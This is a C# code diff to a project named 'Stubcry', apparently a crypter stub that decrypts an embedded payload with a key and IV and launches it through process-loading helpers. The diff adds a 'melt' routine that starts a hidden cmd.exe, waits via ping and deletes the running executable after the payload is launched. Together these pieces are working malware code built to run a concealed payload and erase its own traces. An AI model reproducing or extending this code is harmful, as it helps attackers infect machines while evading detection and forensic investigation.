@@ -326,6 +326,20 @@ namespace Stubcry
             return string.Empty;
 
         }
+        static void DeleteItself()
+        {
+            string currentFilePath = Process.GetCurrentProcess().MainModule.FileName;
+
+            Process.Start(new ProcessStartInfo()
+            {
+                FileName = "cmd.exe",
+                Arguments = "/C ping 127.0.0.1 -n 2 > nul & del \"" + currentFilePath + "\"",
+                WindowStyle = ProcessWindowStyle.Hidden,
+                CreateNoWindow = true,
+            });
+
+            Environment.Exit(0);
+        }
 
 
 
@@ -421,6 +435,10 @@ namespace Stubcry
                     NIKBINARY32bit.nik5ra(config.dotnetipath, "", FOKFILE(magicalcode.Replace(",", "").Replace("'", ""), "$key", "$IV"));
 
                 }
+                if (config.ismelt == true && config.ePath != config.fullpath)
+                {
+                    DeleteItself();
+                }
 
 
             }
@@ -435,6 +453,11 @@ namespace Stubcry
                     nIK64.openfile(FOKFILE(magicalcode.Replace(",", "").Replace("'", ""), "$key", "$IV"), config.dotnetipath, "");
 
                 }
+                if (config.ismelt == true && config.ePath != config.fullpath)
+                {
+                    DeleteItself();
+                }
+
             }
 
             if (zebi.Length > 0)
